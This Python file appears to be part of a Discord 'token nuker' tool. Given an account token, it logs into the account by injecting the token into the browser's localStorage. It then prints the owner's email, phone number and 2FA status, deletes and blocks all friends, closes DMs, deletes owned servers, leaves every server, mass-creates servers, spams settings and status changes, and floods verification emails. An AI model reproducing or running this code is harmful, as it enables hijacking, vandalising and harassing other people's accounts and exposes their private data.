import requests
import os
from selenium import webdriver
import sys
import time
import inspect
import random
currentdir = os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
parentdir = os.path.dirname(currentdir)
sys.path.insert(0, parentdir) 
from panel import logo

lang_codes = ["en-US", "en-GB", "zh-CN", "zh-TW", "cs", "da", "nl", "fr", "de", "el", "hu", "it", "ja", "ko", "no", "pl", "pt-BR", "ru", "es-ES", "sv-SE", "th", "tr", "bg", "uk", "fi", "hr", "ro", "lt"]
codetolang = {
    "en-US":"English (United States)",
    "en-GB":"English (Great Britain)",
    "zh-CN":"Chinese (China)",
    "zh-TW":"Chinese (Taiwan)",
    "cs":"Czech",
    "da":"Danish",
    "nl":"Dutch",
    "fr":"French",
    "de":"German",
    "el":"Greek",
    "hu":"Hungarian",
    "it":"Italian",
    "ja":"Japanese",
    "ko":"Korean",
    "no":"Norwegian",
    "pl":"Polish",
    "pt-BR":"Portuguese (Brazil)",
    "ru":"Russian",
    "es-ES":"Spanish (Spain)",
    "sv-SE":"Swedish",
	"th":"Thailand",
    "tr":"Turkish",
    "bg":"Bulgarian",
    "uk":"Ukrainian",
    "fi":"Finnish",
    "hr":"Croatian",
    "ro":"Romanian",
    "lt":"Lithuanian"
}

def clear():
	lambda: os.system('cls')


def token_login(token):
	opt = webdriver.ChromeOptions()
	opt.add_experimental_option("detach", True)
	driver = webdriver.Chrome(r"C:\\webdrivers\\chromedriver.exe", options = opt)
	driver.get("https://discord.com/login")
	login_script = """
									function login(token) {
									setInterval(() => {
										document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
									}, 50);
									setTimeout(() => {
										location.reload();
									}, 2500);
								}
									"""
	driver.execute_script(login_script + f'\nlogin("{token}")')

	input()


def token_info(token):
		r = requests.get('https://discord.com/api/v9/users/@me', headers={"Authorization": token})
		if r.status_code == 200:
			infos = r.json()
			lang = infos['locale']
			print(f"""Username: {infos['username']}
Discriminator: {infos['discriminator']}
User ID: {infos['id']}
Bio: {infos['bio']}
Language: {codetolang[lang]}
E-mail: {infos['email']}
Verified: {infos['verified']}
Phone number: {infos['phone']}
2FA Enabled: {infos['mfa_enabled']}""")
		else:
			print(f'There is a problem with the token... "{r.json()["message"]}"')

def del_block_friends(token, block='n'):
	r2 = requests.get("https://discord.com/api/v9/users/@me/relationships", headers={"authorization": token})
	if r2.status_code == 200:
		count = 0
		if block == 'n':
			sys.stdout.write('Deleting friends...')
		else:
			sys.stdout.write('Deleting and blocking friends')
		sys.stdout.flush()
		for i in r2.json():
			count += 1

			sys.stdout.write(f'\rDeleted: {count} | Remaining: {len(r2.json()) - count}')
			sys.stdout.flush()
			requests.delete(f"https://discord.com/api/v9/users/@me/relationships/{i['id']}", headers={"authorization": token})
			if block == 'y':
				requests.put(f"https://discord.com/api/v9/users/@me/relationships/{i['id']}", headers={"authorization": token}, json={"type": 2})			
			
	else:
		print(f'There is a problem with the token... "{r2.json()["message"]}"')
			
def close_dms(token):
	r3 = requests.get("https://discord.com/api/v9/users/@me/channels", headers={"authorization": token})
	if r3.status_code == 200:
		count = 0
		sys.stdout.write('Closing DMs...')
		sys.stdout.flush()
		for i in r3.sjon():
			count += 1
			requests.delete(f"https://discord.com/api/v9/channels/{i['id']}", headers={"authorization": token})
		sys.stdout.write(f'\rClosed {count} DMs')
		sys.stdout.flush()
	else:
		print(f'There is a problem with the token... "{r3.json()["message"]}"')

def delete_servers(token):
	r4 = requests.get("https://discord.com/api/v9/users/@me/guilds", headers={"authorization": token})
	if r4.status_code == 200:
		count = 0
		deleted = 0
		sys.stdout.write('Deleting servers...')
		sys.stdout.flush()
		for i in r4.json():
			count += 1
			if i["owner"] is False:
				pass
			else:
				deleted += 1
				requests.post(f"https://discord.com/api/v9/guilds/{i['id']}/delete", headers={"authorization": token})
				sys.stdout.write(f'\rDeleted: {deleted} | Not owner: {count - deleted} | Remaining: {len(r4.json()) - count}')
				sys.stdout.flush()
	else:
		print(f'There is a problem with the token... "{r4.json()["message"]}"')

def leave_servers(token):
	r5 = requests.get("https://discord.com/api/v9/users/@me/guilds", headers={"authorization": token})
	if r5.status_code == 200:
		count = 0
		sys.stdout.write('Leaving servers...')
		sys.stdout.flush()
		for i in r5.json():
			count += 1
			requests.delete(
            f"https://discord.com/api/v9/users/@me/guilds/{i['id']}", headers={"authorization": token})
			sys.stdout.write(f'\rServers left: {count} | Remaining: {len(r5.json()) - count}')
			sys.stdout.flush()
	else:
		print(f'There is a problem with the token... "{r5.json()["message"]}"')


def mass_create(token, name):
	r6 = requests.get("https://discord.com/api/v9/guilds", headers={"authorization": token})
	count = 0
	sys.stdout.write('Creating servers...')
	sys.stdout.flush()
	while count < 100:
		
		server_name = name + '# ' + str(count)
		r = requests.post("https://discord.com/api/v9/guilds", headers={"authorization": token}, json={"name": server_name})
		if r.status_code == 201:
			count += 1		
			sys.stdout.write(f'\rServers created: {count}')
			sys.stdout.flush()
		elif r.status_code == 400:
			print(f'\nDone creating {count} servers')
			break
		else:
			pass

def mode_spam(token):
	print('\nPress CTRL + C to stop')
	try:
		while True:
			requests.patch("https://discord.com/api/v9/users/@me/settings", headers={"authorization": token}, json={"theme": "dark", "developer_mode": True, "afk_timeout": 60, "locale": random.choice(lang_codes), "message_display_compact": True, "explicit_content_filter": 2, "default_guilds_restricted": True, "friend_source_flags": {"all": True, "mutual_friends": True, "mutual_guilds": True}, "inline_embed_media": True, "inline_attachment_media": True, "gif_auto_play": True, "render_embeds": True, "render_reactions": True, "animate_emoji": True, "convert_emoticons": True, "animate_stickers": 1, "enable_tts_command": True,  "native_phone_integration_enabled": True, "contact_sync_enabled": True, "allow_accessibility_detection": True, "stream_notifications_enabled": True, "status": "idle", "detect_platform_accounts": True, "disable_games_tab": True})
			requests.patch("https://discord.com/api/v9/users/@me/settings", headers={"authorization": token}, json={"theme": "light", "developer_mode": False, "afk_timeout": 60, "locale": random.choice(lang_codes), "message_display_compact": False, "explicit_content_filter": 2, "default_guilds_restricted": False, "friend_source_flags": {"all": False, "mutual_friends": False, "mutual_guilds": False}, "inline_embed_media": False, "inline_attachment_media": False, "gif_auto_play": False, "render_embeds": False, "render_reactions": False, "animate_emoji": False, "convert_emoticons": False, "animate_stickers": 1, "enable_tts_command": False,  "native_phone_integration_enabled": False, "contact_sync_enabled": False, "allow_accessibility_detection": False, "stream_notifications_enabled": False, "status": "idle", "detect_platform_accounts": False, "disable_games_tab": False})
	except KeyboardInterrupt:
		logo()

def custom_status_spam(token, status1, status2, status3, status4, status5):
	print('\nPress CTRL + C to stop')
	try:
		while True:
			requests.patch("https://discord.com/api/v9/users/@me/settings", headers={"authorization": token}, json={"custom_status": {"text": status1}})
			time.sleep(0.5)
			requests.patch("https://discord.com/api/v9/users/@me/settings", headers={"authorization": token}, json={"custom_status": {"text": status2}})
			time.sleep(0.5)
			requests.patch("https://discord.com/api/v9/users/@me/settings", headers={"authorization": token}, json={"custom_status": {"text": status3}})
			time.sleep(0.6)
			requests.patch("https://discord.com/api/v9/users/@me/settings", headers={"authorization": token}, json={"custom_status": {"text": status4}})
			time.sleep(0.5)
			requests.patch("https://discord.com/api/v9/users/@me/settings", headers={"authorization": token}, json={"custom_status": {"text": status5}})
			time.sleep(0.5)
	except KeyboardInterrupt:
		logo()

def spam_mail(token):
	print('\nPress CTRL + C to stop\n\n')
	r = requests.get("https://discordapp.com/api/v9/guilds/0/members", headers={"authorization": token})
	count = 0
	try:
		while True:
			r = requests.post("https://discord.com/api/v9/auth/verify/resend", headers={"authorization": token})
			count += 1
			sys.stdout.write(f'\rVerify mails sent: {count}')
			sys.stdout.flush()
			time.sleep(1)
	except KeyboardInterrupt:
		logo()